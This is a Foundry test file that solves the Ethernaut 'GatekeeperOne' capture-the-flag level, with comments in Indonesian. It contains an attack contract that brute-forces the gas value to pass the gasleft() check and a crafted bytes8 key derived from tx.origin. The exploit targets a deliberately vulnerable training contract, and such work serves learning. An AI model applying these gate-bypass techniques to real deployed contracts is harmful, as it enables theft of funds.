// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {GatekeeperOne} from "src/levels/GatekeeperOne.sol";
import {GatekeeperOneFactory} from "src/levels/GatekeeperOneFactory.sol";

contract GatekeeperOneAttack {
    function attack(address gatekeeper, bytes8 key) external returns (bool) {
        // gateTwo: gasleft() % 8191 == 0 saat modifier dicek. Coba 8191
        // nilai gas berurutan — salah satunya pasti mengenai residu 0.
        for (uint256 gasToUse = 150000; gasToUse < 150000 + 8191; gasToUse++) {
            (bool ok,) = gatekeeper.call{gas: gasToUse}(
                abi.encodeWithSignature("enter(bytes8)", key)
            );
            if (ok) return true;
        }
        return false;
    }
}

contract GatekeeperOneSolve is Test {
    GatekeeperOneFactory factory;
    GatekeeperOne instance;
    address player = address(0xBEEF);

    function setUp() public {
        factory = new GatekeeperOneFactory();
        instance = GatekeeperOne(factory.createInstance(player));
    }

    function testInit() public view {
        assertFalse(factory.validateInstance(payable(address(instance)), player));
    }

    function testSolve() public {
        // gateThree: uint32(key64) == uint16(key64) == uint16(tx.origin),
        // dan uint32(key64) != key64. Untuk player 0xBEEF:
        // key64 = 0x000000010000BEEF (low32 = 0xBEEF, high32 != 0).
        bytes8 key = bytes8(uint64((uint64(1) << 32) | uint64(uint16(uint160(player)))));
        GatekeeperOneAttack attack = new GatekeeperOneAttack();
        // prank 2 argumen: msg.sender DAN tx.origin = player (gateThree
        // memakai tx.origin; prank 1 argumen hanya mengubah msg.sender).
        vm.startPrank(player, player);
        bool ok = attack.attack(address(instance), key);
        vm.stopPrank();
        assertTrue(ok);
        assertTrue(factory.validateInstance(payable(address(instance)), player));
    }
}
